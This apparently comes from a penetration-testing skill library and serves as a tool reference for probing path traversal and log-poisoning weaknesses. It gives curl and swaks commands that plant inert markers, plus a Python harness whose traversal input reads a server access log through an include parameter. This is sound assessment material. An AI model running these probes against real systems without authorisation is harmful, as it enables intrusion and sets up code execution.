# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`path-traversal-and-lfi-log-and-cache-poisoning`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `curl` | `curl -sS -A 'assessor-pl-logpoison-probe' 'https://target.example/'` | Plant an inert User-Agent marker into the access log through its normal ingestion path | Cross-platform |
| `swaks` | `swaks --to user@target.example --server target.example --header 'Subject: pl-logpoison-inert-marker'` | Write an inert marker into the mail spool to test the non-log write channel | Linux, macOS |
| `Burp Suite Repeater` | `Send the marker-plant request and the include request as an ordered pair` | Keeps the write-then-include sequence deterministic so the before and after differ by one line | Cross-platform |

## Minimal Script Shape

A plant-then-include harness: it writes an inert User-Agent marker, then reads the include route targeting the log and reports whether the marker is reflected (write-plus-include works) or absent (format or path blocks it).

```python
import urllib.parse
import urllib.request

SITE = "https://target.example/"
INCLUDE = "https://target.example/index.php"
MARKER = "pl-logpoison-inert"

def plant():
    req = urllib.request.Request(SITE, headers={"User-Agent": MARKER})
    with urllib.request.urlopen(req, timeout=10) as r:
        return r.status

def include(path):
    url = INCLUDE + "?" + urllib.parse.urlencode({"view": path})
    req = urllib.request.Request(url, headers={"User-Agent": "authorised-assessment"})
    with urllib.request.urlopen(req, timeout=10) as r:
        return r.read().decode("utf-8", "replace")

plant()
body = include("../../../../var/log/apache2/access.log")
reflected = MARKER in body
print({"planted": True, "marker_reflected_in_include": reflected,
       "verdict": "write-plus-include" if reflected else "blocked-or-encoded"})
```
